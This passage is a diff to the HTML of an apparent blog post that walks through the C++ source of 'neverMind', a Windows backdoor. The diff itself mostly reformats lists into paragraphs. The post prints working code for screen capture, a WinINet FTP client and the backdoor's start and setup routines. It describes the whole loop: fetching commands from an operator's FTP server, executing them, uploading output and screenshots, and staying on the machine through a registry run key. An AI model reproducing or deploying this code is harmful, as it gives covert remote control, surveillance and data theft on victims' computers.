@@ -36,7 +36,10 @@
     <link rel="stylesheet" href="/css/custom.css">
 </head>
 <body>
-    
+    <div id="landing">
+        <div id="landing-canva"></div>
+        <div id="landing-content">
+            
 <div id="content-area" data-page-type="single">
     <article id="post">
         <header>
@@ -63,42 +66,20 @@
 </li>
 </ol>
 <h2 id="flow">flow</h2>
-<ol>
-<li>
 <p><strong>initialization</strong>: the program begins by creating an instance of the <code>neverMind</code> class, which takes the FTP server&rsquo;s host, username, and password as parameters. this instance is used to manage the backdoor&rsquo;s operations.</p>
-</li>
-<li>
 <p><strong>setup</strong>: if the backdoor hasn&rsquo;t been set up before, the <code>setup</code> method in the <code>neverMind</code> class creates the necessary directories and adds the backdoor to the registry for persistence.</p>
-</li>
-<li>
 <p><strong>command execution</strong>: the <code>start</code> method in the <code>neverMind</code> class is the main driver of the program. it connects to the FTP server, downloads the <code>cmd.txt</code> file, compiles + executes the commands, and then uploads the <code>output.txt</code> file.</p>
-</li>
-<li>
 <p><strong>command compilation</strong>: the <code>compile</code> method reads the <code>cmd.txt</code> file, splits each line into a vector of strings, and then executes each command.</p>
-</li>
-<li>
 <p><strong>command handling</strong>: the <code>execute</code> method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: <code>print</code>, <code>screen</code>, <code>upload</code>, <code>download</code>, <code>exec</code>.</p>
-</li>
-<li>
 <p><strong>FTP operations</strong>: the <code>neverMind</code> class uses an instance of the <code>ftpC</code> class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.</p>
-</li>
-<li>
 <p><strong>utility functions</strong>: the <code>wrapper</code> class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.</p>
-</li>
-<li>
 <p><strong>persistence</strong>: the program adds itself to the registry to ensure it runs every time the system starts.</p>
-</li>
-<li>
 <p><strong>cleanup</strong>: when the program is done, it closes the FTP + internet connections in the <code>ftpC</code> class destructor.</p>
-</li>
-</ol>
 <h2 id="code">code</h2>
 <h3 id="the-wrapper">the wrapper</h3>
 <p>the <code>wrapper</code> class defined in <code>wrapper.h</code> and implemented in <code>wrapper.cpp</code> provides a set of utility functions for file operations, system information retrieval, and screen capture.</p>
 <h4 id="file-operations">file operations</h4>
-<ul>
-<li><code>read_file(const std::string&amp; file_path)</code>: reads the content of a file located at <code>file_path</code> and returns it as a string. If the file cannot be opened, it throws a <code>FileError</code> exception.</li>
-</ul>
+<p><code>read_file(const std::string&amp; file_path)</code>: reads the content of a file located at <code>file_path</code> and returns it as a string. If the file cannot be opened, it throws a <code>FileError</code> exception.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string wrapper<span style="color:#f92672">::</span>read_file(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>file_path)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>ifstream file(file_path);
@@ -111,9 +92,7 @@
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> text;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>write_file(const std::string&amp; file_path, const std::string&amp; content)</code>: writes content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</li>
-</ul>
+</span></span></code></pre></div><p><code>write_file(const std::string&amp; file_path, const std::string&amp; content)</code>: writes content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> wrapper<span style="color:#f92672">::</span>write_file(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>file_path, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>content)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>ofstream file(file_path);
@@ -121,9 +100,7 @@
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> FileError(<span style="color:#e6db74">&#34;[!] failed to open file: &#34;</span> <span style="color:#f92672">+</span> file_path);
 </span></span><span style="display:flex;"><span>        file <span style="color:#f92672">&lt;&lt;</span> content;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>append_file(const std::string&amp; file_path, const std::string&amp; content)</code>: appends content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</li>
-</ul>
+</span></span></code></pre></div><p><code>append_file(const std::string&amp; file_path, const std::string&amp; content)</code>: appends content to a file located at <code>file_path</code>. if the file cannot be opened, it throws a <code>FileError</code> exception.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> wrapper<span style="color:#f92672">::</span>append_file(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> file_path, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> content)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>ofstream file(file_path, std<span style="color:#f92672">::</span>ios_base<span style="color:#f92672">::</span>app);
@@ -131,17 +108,13 @@
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> FileError(<span style="color:#e6db74">&#34;[!] failed to open file: &#34;</span> <span style="color:#f92672">+</span> file_path);
 </span></span><span style="display:flex;"><span>        file <span style="color:#f92672">&lt;&lt;</span> content;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>path_exists(const std::string&amp; path)</code>: checks if a path exists in the file system and returns a boolean value indicating the result.</li>
-</ul>
+</span></span></code></pre></div><p><code>path_exists(const std::string&amp; path)</code>: checks if a path exists in the file system and returns a boolean value indicating the result.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> wrapper<span style="color:#f92672">::</span>path_exists(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> path)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>exists(path);
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><h4 id="system-information-retrieval">system information retrieval</h4>
-<ul>
-<li><code>get_username()</code>: retrieves the username of the current user from the environment variables.</li>
-</ul>
+<p><code>get_username()</code>: retrieves the username of the current user from the environment variables.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string wrapper<span style="color:#f92672">::</span>get_username()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> env[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;USERNAME&#34;</span>;
@@ -150,9 +123,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> out_size <span style="color:#f92672">=</span> GetEnvironmentVariableA(env, buffer, username_len);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> std<span style="color:#f92672">::</span>string(buffer, out_size);
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>last_error_string()</code>: Retrieves the last error message recorded by the system.</li>
-</ul>
+</span></span></code></pre></div><p><code>last_error_string()</code>: Retrieves the last error message recorded by the system.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string wrapper<span style="color:#f92672">::</span>last_error_string()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        DWORD errorMessageID <span style="color:#f92672">=</span> <span style="color:#f92672">::</span>GetLastError();
@@ -164,9 +135,7 @@
 </span></span><span style="display:flex;"><span>        LocalFree(messageBuffer); <span style="color:#75715e">// free up the buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> message;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>listdir(const std::string&amp; path)</code>: Lists the contents of a directory specified by path and returns them as a vector of strings.</li>
-</ul>
+</span></span></code></pre></div><p><code>listdir(const std::string&amp; path)</code>: Lists the contents of a directory specified by path and returns them as a vector of strings.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>string<span style="color:#f92672">&gt;</span> wrapper<span style="color:#f92672">::</span>listdir(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> path)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>std<span style="color:#f92672">::</span>string<span style="color:#f92672">&gt;</span> directory_content;
@@ -177,9 +146,7 @@
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> directory_content;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>get_date()</code>: Returns the current date and time as a string in the format &ldquo;dd-mm-yyyy_hh-mm-ss&rdquo;.</li>
-</ul>
+</span></span></code></pre></div><p><code>get_date()</code>: Returns the current date and time as a string in the format &ldquo;dd-mm-yyyy_hh-mm-ss&rdquo;.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string wrapper<span style="color:#f92672">::</span>get_date()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">auto</span> t <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>time(<span style="color:#66d9ef">nullptr</span>);
@@ -189,9 +156,7 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> oss.str();
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><h4 id="screen-capture">screen capture</h4>
-<ul>
-<li><code>createBitmapHeader(int width, int height)</code>: creates a bitmap header with the specified width and height.</li>
-</ul>
+<p><code>createBitmapHeader(int width, int height)</code>: creates a bitmap header with the specified width and height.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BITMAPINFOHEADER wrapper<span style="color:#f92672">::</span>createBitmapHeader(<span style="color:#66d9ef">int</span> width, <span style="color:#66d9ef">int</span> height)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    BITMAPINFOHEADER bi;
@@ -208,9 +173,7 @@
 </span></span><span style="display:flex;"><span>    bi.biClrImportant <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bi;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><ul>
-<li><code>GdiPlusScreenCapture(HWND hWnd)</code>: captures the screen of the window specified by <code>hWnd</code> and returns a handle to the bitmap of the screenshot.</li>
-</ul>
+</span></span></code></pre></div><p><code>GdiPlusScreenCapture(HWND hWnd)</code>: captures the screen of the window specified by <code>hWnd</code> and returns a handle to the bitmap of the screenshot.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>HBITMAP wrapper<span style="color:#f92672">::</span>GdiPlusScreenCapture(HWND hWnd)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    HDC hwindowDC <span style="color:#f92672">=</span> GetDC(hWnd);
@@ -230,9 +193,7 @@
 </span></span><span style="display:flex;"><span>    ReleaseDC(hWnd, hwindowDC);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hbwindow;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><ul>
-<li><code>saveToMemory(HBITMAP* hbitmap, std::vector&lt;BYTE&gt;&amp; data, std::string dataFormat)</code>: saves a bitmap specified by <code>hbitmap</code> to memory in the format specified by <code>dataFormat</code> and stores the data in data.</li>
-</ul>
+</span></span></code></pre></div><p><code>saveToMemory(HBITMAP* hbitmap, std::vector&lt;BYTE&gt;&amp; data, std::string dataFormat)</code>: saves a bitmap specified by <code>hbitmap</code> to memory in the format specified by <code>dataFormat</code> and stores the data in data.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> wrapper<span style="color:#f92672">::</span>saveToMemory(HBITMAP<span style="color:#f92672">*</span> hbitmap, std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>BYTE<span style="color:#f92672">&gt;&amp;</span> data, std<span style="color:#f92672">::</span>string dataFormat)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    Gdiplus<span style="color:#f92672">::</span>Bitmap bmp(<span style="color:#f92672">*</span>hbitmap, <span style="color:#66d9ef">nullptr</span>);
@@ -257,9 +218,7 @@
 </span></span><span style="display:flex;"><span>    istream<span style="color:#f92672">-&gt;</span>Release();
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> true;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><ul>
-<li><code>screenshot(const std::string&amp; path)</code>: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.</li>
-</ul>
+</span></span></code></pre></div><p><code>screenshot(const std::string&amp; path)</code>: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#f92672">::</span>string wrapper<span style="color:#f92672">::</span>screenshot(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> path)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string full_path <span style="color:#f92672">=</span> (std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>path(path) <span style="color:#f92672">/</span> std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>path((wrapper<span style="color:#f92672">::</span>get_date() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.jpg&#34;</span>))).u8string();
@@ -284,16 +243,12 @@
 <h3 id="ftpc">ftpC</h3>
 <p>the <code>ftpC</code> class defined in <code>ftp.h</code> and implemented in <code>ftp.cpp</code> provides a set of functions for FTP operations. the <code>ftpC</code> class uses the WinINet API to perform FTP operations. The <code>m_host</code>, <code>m_username</code>, and <code>m_password</code> member variables store the host, username, and password for the FTP connection. The <code>ftpIO</code> and <code>ftpS</code> member variables are handles to the internet connection and the FTP session, respectively.</p>
 <h4 id="constructor--destructor">constructor + destructor</h4>
-<ul>
-<li><code>ftpC(const std::string&amp; host, const std::string&amp; username, const std::string&amp; password)</code>: the constructor initializes the FTP connection with the provided host, username, and password.</li>
-</ul>
+<p><code>ftpC(const std::string&amp; host, const std::string&amp; username, const std::string&amp; password)</code>: the constructor initializes the FTP connection with the provided host, username, and password.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#f92672">::</span>ftpC(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> host, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> username, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> password)
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> m_host(host), m_username(username), m_password(password), ftpIO(NULL), ftpS(NULL)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>~ftpC()</code>: the destructor cleans up the FTP connection by closing the internet + FTP handles.</li>
-</ul>
+</span></span></code></pre></div><p><code>~ftpC()</code>: the destructor cleans up the FTP connection by closing the internet + FTP handles.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ftpC<span style="color:#f92672">::~</span>ftpC()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ftpS)
@@ -308,9 +263,7 @@
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><h4 id="ftp-operations">FTP operations</h4>
-<ul>
-<li><code>connect()</code>: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error.</li>
-</ul>
+<p><code>connect()</code>: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> ftpC<span style="color:#f92672">::</span>connect()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        ftpIO <span style="color:#f92672">=</span> InternetOpenA(<span style="color:#e6db74">&#34;SystemConnection&#34;</span>, INTERNET_OPEN_TYPE_DIRECT, m_host.c_str(), <span style="color:#ae81ff">0</span>, INTERNET_FLAG_CACHE_IF_NET_FAIL);
@@ -335,33 +288,25 @@
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> std<span style="color:#f92672">::</span>runtime_error(<span style="color:#e6db74">&#34;[!] failed to connect to ftp server: &#34;</span> <span style="color:#f92672">+</span> errorMessage);
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>upload_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.</li>
-</ul>
+</span></span></code></pre></div><p><code>upload_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> ftpC<span style="color:#f92672">::</span>upload_file(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> local_path, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> server_name)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        BOOL result <span style="color:#f92672">=</span> FtpPutFileA(ftpS, local_path.c_str(), server_name.c_str(), FTP_TRANSFER_TYPE_BINARY, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>retr_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function downloads a file from the FTP server to the local path.</li>
-</ul>
+</span></span></code></pre></div><p><code>retr_file(const std::string&amp; local_path, const std::string&amp; server_name)</code>: this function downloads a file from the FTP server to the local path.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> ftpC<span style="color:#f92672">::</span>retr_file(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> local_path, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> server_name)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        BOOL result <span style="color:#f92672">=</span> FtpGetFileA(ftpS, server_name.c_str(), local_path.c_str(), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_HYPERLINK);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>mkdir(const std::string&amp; folder_name)</code>: this function creates a new directory on the FTP server with the specified folder name.</li>
-</ul>
+</span></span></code></pre></div><p><code>mkdir(const std::string&amp; folder_name)</code>: this function creates a new directory on the FTP server with the specified folder name.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> ftpC<span style="color:#f92672">::</span>mkdir(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> folder_name)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        BOOL result <span style="color:#f92672">=</span> FtpCreateDirectoryA(ftpS, folder_name.c_str());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result;
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>cd(const std::string&amp; server_path)</code>: this function changes the current directory on the FTP server to the directory specified by <code>server_path</code>.</li>
-</ul>
+</span></span></code></pre></div><p><code>cd(const std::string&amp; server_path)</code>: this function changes the current directory on the FTP server to the directory specified by <code>server_path</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> ftpC<span style="color:#f92672">::</span>cd(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string<span style="color:#f92672">&amp;</span> server_path)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        BOOL result <span style="color:#f92672">=</span> FtpSetCurrentDirectoryA(ftpS, server_path.c_str());
@@ -370,23 +315,17 @@
 </span></span></code></pre></div><h3 id="nevermind">neverMind</h3>
 <p>the <code>neverMind</code> class defined in <code>neverMind.h</code> and implemented in <code>neverMind.cpp</code> provides a set of functions for backdoor operations.</p>
 <h4 id="constructor--destructor-1">constructor + destructor</h4>
-<ul>
-<li><code>neverMind(const std::string &amp;host, const std::string &amp;username, const std::string &amp;password)</code>: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.</li>
-</ul>
+<p><code>neverMind(const std::string &amp;host, const std::string &amp;username, const std::string &amp;password)</code>: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#f92672">::</span>neverMind(<span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>host, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>username, <span style="color:#66d9ef">const</span> std<span style="color:#f92672">::</span>string <span style="color:#f92672">&amp;</span>password)
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> ftp_host(host), ftp_username(username), ftp_password(password), ftp_connection(ftpC(ftp_host, ftp_username, ftp_password)), win_username(wrapper<span style="color:#f92672">::</span>get_username()), store_path(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> win_username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">AppData</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Local</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">SystemConnect&#34;</span>), data_path((std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>path(store_path) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;data&#34;</span>).u8string()), app_path((std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>path(store_path) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;app&#34;</span>).u8string()), output_path((std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>path(data_path) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;output.txt&#34;</span>).u8string())
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>~neverMind()</code>: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!</li>
-</ul>
+</span></span></code></pre></div><p><code>~neverMind()</code>: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>neverMind<span style="color:#f92672">::~</span>neverMind()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><h4 id="backdoor-operations">backdoor operations</h4>
-<ul>
-<li><code>start()</code>: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.</li>
-</ul>
+<p><code>start()</code>: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> neverMind<span style="color:#f92672">::</span>start()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>exists(store_path))
@@ -404,9 +343,7 @@
 </span></span><span style="display:flex;"><span>        ftp_connection.upload_file(output_path, <span style="color:#e6db74">&#34;output.txt&#34;</span>);
 </span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">2000</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
-<li><code>setup()</code>: this function sets up necessary directories and adds the backdoor to the registry for persistence.</li>
-</ul>
+</span></span></code></pre></div><p><code>setup()</code>: this function sets up necessary directories and adds the backdoor to the registry for persistence.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> neverMind<span style="color:#f92672">::</span>setup()
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>create_directory(store_path);
@@ -414,9 +351,7 @@
 </span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>filesystem<span style="color:#f92672">::</span>create_directory(app_path);
 </span></span><span style="display:flex;"><span>        add_to_reg();
 </span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><ul>
